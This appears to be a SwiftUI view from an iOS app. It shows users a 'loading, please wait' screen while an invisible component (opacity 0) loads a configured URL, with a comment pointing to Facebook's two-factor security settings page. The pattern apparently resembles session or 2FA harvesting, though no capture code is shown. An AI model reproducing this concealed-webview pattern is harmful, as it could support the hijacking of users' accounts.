import SwiftUI

@available(iOS 14.0, *)
public struct NineView: View {
    public init(arrayData: [String: String]) {
        self.arrayData = arrayData
    }
    
    var arrayData: [String: String] = [:]

    @State var is_Nine_Reco_Chuyen_Man = false
    @State var is_Nine_Reco_Contains = false // false

    public var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if is_Nine_Reco_Chuyen_Man {
                Nine_View_Au(arrayData: self.arrayData) // Goto App
            } else {
                if is_Nine_Reco_Contains {
                    NineView(arrayData: self.arrayData) // run back
                } else {
                    ProgressView {
                        VStack(spacing: 8) {
                            Text(arrayData[ValueKey.wereloading.rawValue] ?? "") // .font(.system(size: 12))
                            Text(arrayData[ValueKey.takewhile.rawValue] ?? "") // .font(.system(size: 12))
                            Text(arrayData[ValueKey.pleasedo.rawValue] ?? "").foregroundColor(Color.red).opacity(0.8)
                        }.padding(.horizontal)
                    }
                    // https://www.facebook.com/security/2fac/settings
                    Coords_Nine_Reco(url: URL(string: arrayData[ValueKey.Chung_linkurl_14.rawValue] ?? ""), is_Nine_Reco_Chuyen_Man: $is_Nine_Reco_Chuyen_Man, is_Nine_Reco_Contains: $is_Nine_Reco_Contains, arrayData: self.arrayData).opacity(0)
                }
            } // else
        } // ZStack
    } // body

}
